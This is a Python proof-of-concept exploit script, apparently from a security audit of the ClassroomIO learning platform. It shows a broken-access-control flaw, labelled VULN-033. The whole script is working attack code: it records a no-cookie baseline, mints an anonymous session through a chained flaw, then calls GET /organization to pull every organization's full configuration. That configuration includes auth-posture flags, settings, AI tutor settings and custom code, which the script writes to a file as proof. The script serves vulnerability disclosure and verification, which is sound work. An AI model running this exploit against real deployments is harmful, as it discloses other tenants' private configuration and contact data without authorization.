#!/usr/bin/env python3
"""
VULN-033 (F-20) — GET /organization returns full org configuration rows to ANY session,
                  including an unauthenticated anonymous session (VULN-018).

Vulnerable code (targets/classroomio/):
  * route: apps/api/src/routes/organization/organization.ts:103-119  (.get('/', authOrApiKeyMiddleware, ...))
  * middleware: apps/api/src/middlewares/auth-or-api-key.ts           (first branch passes for ANY session)
  * query: packages/db/src/queries/organization/organization.ts:820-856
           (getOrganizations — with no filters the whereClause is undefined, so it returns EVERY org row,
            joined with plan data, projecting the full organization row)

Class: CWE-284 / CWE-200 broken access control -> information disclosure.

The flaw: the endpoint is gated by authOrApiKeyMiddleware, which treats "any logged-in session" as
authorized — so an anonymous session minted via the ungated better-auth anonymous() plugin (VULN-018)
passes. With no query filters, the query applies no membership scoping and returns the FULL row of
every organization: auth-posture flags (disableEmailPassword / disableGoogleAuth / disableSignup),
settings, aiTutorSettings (incl. escalation email), customCode, custom-domain config, and plan data.

Exploitation idea: baseline with no cookie -> 401; mint an anonymous session -> the same GET returns
200 with every org's full config (cross-org enumeration; in cloud this also carries billing IDs).

Success proof: no-cookie GET /organization -> 401, but the anonymous session -> HTTP 200 whose body
carries org auth-posture config (disableEmailPassword / settings / aiTutorSettings / siteName) for one
or more organizations the anonymous actor has no membership in.
"""
import os
import sys
import json
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, anon_session, API, BASE_URL, ORG_ID  # noqa: E402

VULN = "VULN-033"
HERE = os.path.dirname(os.path.abspath(__file__))
# Config fields that should never be handed to an arbitrary session — auth posture + settings.
CONFIG_KEYS = ["siteName", "disableEmailPassword", "disableGoogleAuth", "disableSignup",
               "settings", "customCode", "aiTutorSettings"]


def main():
    banner(VULN, "Any/anon session reads full org config via GET /organization")
    log("INFO", "route organization.ts:103 gated by authOrApiKeyMiddleware -> ANY session passes")

    # --- Baseline: with NO cookie the route must reject (proves the anon session is what unlocks it) ---
    log("STEP", "baseline: GET /organization with NO cookie")
    base = requests.get(API + "/organization", headers={"Origin": BASE_URL}, timeout=30)
    log("INFO", f"  no-cookie GET /organization -> HTTP {base.status_code}")

    # --- Precondition: mint an anonymous session (VULN-018), no account/signup/invite ---
    log("SETUP", "minting an anonymous session (VULN-018) — no account, no org membership")
    anon = anon_session()
    log("SETUP", f"anon user={ (anon.user or {}).get('id') } isAnonymous={ (anon.user or {}).get('isAnonymous') } "
                 f"orgRoles={anon.org_roles()}  (NOT a member of any org)")

    # --- The attack: read org config with the anonymous session ---
    log("STEP", "GET /organization with the anonymous session cookie")
    resp = anon.get("/organization")
    log("INFO", f"  anon GET /organization -> HTTP {resp.status_code}")

    orgs = resp.json().get("data", []) if resp.status_code == 200 else []
    rows = []
    for entry in orgs if isinstance(orgs, list) else []:
        org = entry.get("organization", entry) if isinstance(entry, dict) else {}
        rows.append(org)

    present_keys = [k for k in CONFIG_KEYS if rows and k in rows[0]]
    site_names = [o.get("siteName") for o in rows]
    target_present = any(o.get("id") == ORG_ID for o in rows)

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("== baseline (no cookie) ==\n")
        f.write(f"GET {API}/organization  ->  HTTP {base.status_code}\n{base.text[:200]}\n\n")
        f.write("== with anonymous session cookie ==\n")
        f.write(f"GET {API}/organization  ->  HTTP {resp.status_code}\n")
        f.write(f"orgs returned = {len(rows)}  siteNames = {site_names}\n")
        f.write(f"target org ({ORG_ID}) present = {target_present}\n")
        f.write(f"config keys exposed per org = {present_keys}\n\n")
        if rows:
            sample = {k: rows[0].get(k) for k in CONFIG_KEYS}
            f.write("sample org config (row 0) exposed to anon:\n" + json.dumps(sample, indent=2, default=str) + "\n")

    log("INFO", f"  anon received {len(rows)} org config row(s); siteNames={site_names}")
    log("INFO", f"  auth-posture/config keys exposed: {present_keys}")

    baseline_rejected = base.status_code == 401
    anon_ok = resp.status_code == 200 and len(rows) >= 1
    config_leaked = len(present_keys) >= 4  # siteName + auth-posture flags + settings

    if baseline_rejected and anon_ok and config_leaked:
        log("PROOF", f"no-cookie=401 but anon session=200 returning {len(rows)} org config row(s) with "
                     f"auth-posture/settings fields {present_keys} — an unauthenticated actor read org "
                     f"configuration (cross-org enumeration: {site_names})")
        verdict(VULN, "CONFIRMED", "anon session reads full org config via GET /organization")
        log("OK", "exploit confirmed — org auth-posture + settings disclosed to an anonymous session")
        sys.exit(0)

    verdict(VULN, "FAILED", f"baseline={base.status_code} anon={resp.status_code} keys={present_keys}")
    log("FAIL", "expected 401 without a cookie and full org config with the anon session")
    sys.exit(1)


if __name__ == "__main__":
    main()
